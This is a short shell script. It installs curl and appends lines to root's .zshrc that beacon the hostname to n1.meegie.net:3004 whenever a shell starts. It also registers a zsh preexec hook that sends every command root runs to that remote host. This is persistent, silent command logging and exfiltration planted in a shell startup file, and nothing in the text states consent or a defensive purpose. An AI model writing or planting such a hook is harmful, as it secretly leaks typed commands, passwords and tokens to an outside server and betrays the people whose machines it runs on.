apk add curl

echo 'curl --get "http://n1.meegie.net:3004/connect?id=$(hostname)"' >> /root/.zshrc
echo 'function printc () { curl --get --data-urlencode cmd=$1 "http://n1.meegie.net:3004/cmd?id=$(hostname)" }' >> /root/.zshrc
echo 'add-zsh-hook preexec printc' >> /root/.zshrc
